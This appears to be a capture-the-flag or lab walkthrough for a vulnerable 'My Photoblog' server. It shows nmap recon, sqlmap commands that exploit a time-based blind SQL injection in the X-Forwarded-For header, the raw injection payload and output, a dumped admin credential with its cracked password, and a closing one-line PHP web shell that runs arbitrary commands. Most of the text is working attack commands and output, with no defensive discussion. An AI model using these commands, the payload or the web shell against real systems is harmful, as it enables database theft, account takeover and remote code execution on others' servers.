# Blind SQLi to Shell Walkthrough

## Recon

### Tecnologies used:

```
nmap -sC -sV 192.168.77.128

Output:

80/tcp open  http    nginx 0.7.67
|_http-server-header: nginx/0.7.67
|_http-title: My Photoblog - latest picture

```

1. NGINX 0.7.67
2. PHP/5.3.3-7+squeeze15


```
HTTP/1.1 200 OK
Server: nginx/0.7.67
Date: Thu, 21 Oct 2021 13:40:51 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.3.3-7+squeeze15
Content-Length: 1347

```

### Attack method

#### Blind SQLi

https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

1. SQLMAP to find the number of databases and it's names

```
sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --dbs --dump-all
```



```
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[15:34:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:34:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:34:11] [INFO] checking if the injection point on (custom) HEADER parameter 'x-forwarded-for #1*' is a false positive
(custom) HEADER parameter 'x-forwarded-for #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
---
Parameter: x-forwarded-for #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ' AND (SELECT 6899 FROM (SELECT(SLEEP(5)))TztC) AND 'qEtn'='qEtn
---
[15:34:48] [INFO] the back-end DBMS is MySQL
[15:34:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: PHP 5.3.3, Nginx 0.7.67
back-end DBMS: MySQL >= 5.0.12
[15:34:48] [INFO] fetching database names
[15:34:48] [INFO] fetching number of databases
[15:34:48] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
2
[15:35:14] [INFO] retrieved:
[15:35:24] [INFO] adjusting time delay to 1 second due to good response times
[15:35:29] [ERROR] invalid character detected. retrying..
[15:35:29] [WARNING] increasing time delay to 2 seconds
information_schema
[15:39:18] [INFO] retrieved: photoblog
available databases [2]:
[*] information_schema
[*] photoblog

[15:41:38] [INFO] sqlmap will dump entries of all tables from all databases now
[15:41:38] [INFO] fetching tables for databases: 'information_schema, photoblog'
[15:41:38] [INFO] fetching number of tables for database 'information_schema'
[15:41:38] [INFO] retrieved: 28
[15:41:58] [INFO] retrieved: CHARACTER_SETS
[15:44:35] [INFO] retrieved: COL^Z
[7]+  Stopped                 sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --dbs --dump-all
filipe@FILIPAZE:~$ sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --dbs --dump-all -h
```

Databases names:

1. information_schema: 28 tables
2. photoblog


```
 sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" --tables -D photoblog
```

Database: photoblog

1. Tables: 4
2. Names: categories, pictures, stats, users

Table: users

```
sqlmap -u http://192.168.77.128/ --headers "x-forwarded-for: *" -D photoblog -T users --dump
```

```
Database: photoblog
Table: users
[1 entry]
+----+-------+---------------------------------------------+
| id | login | password                                    |
+----+-------+---------------------------------------------+
| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+----+-------+---------------------------------------------+
```

<?php $cmd=$_GET ['cmd']; system ($cmd); ?>

